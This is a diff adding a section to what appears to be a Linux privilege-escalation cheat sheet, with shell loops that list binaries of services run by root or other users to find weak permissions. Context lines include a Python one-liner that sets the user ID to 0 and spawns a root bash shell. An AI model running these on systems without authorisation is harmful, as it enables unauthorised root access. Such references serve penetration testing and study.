@@ -1006,6 +1006,14 @@ sudo systemctl start privesc.service
 #Post running rootbash to upgrade our shell fully
 python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' #You can also use python3 with the same command if its present instead
 ```
+### Identifing Vulnrable Services
+```bash
+#Identify all weak permission services running as root
+for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
+
+#Identify all weak permissioned services running as another user, other than root
+for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
+```
 
 ### One-liners to Identify Service Vulnerabilities
 
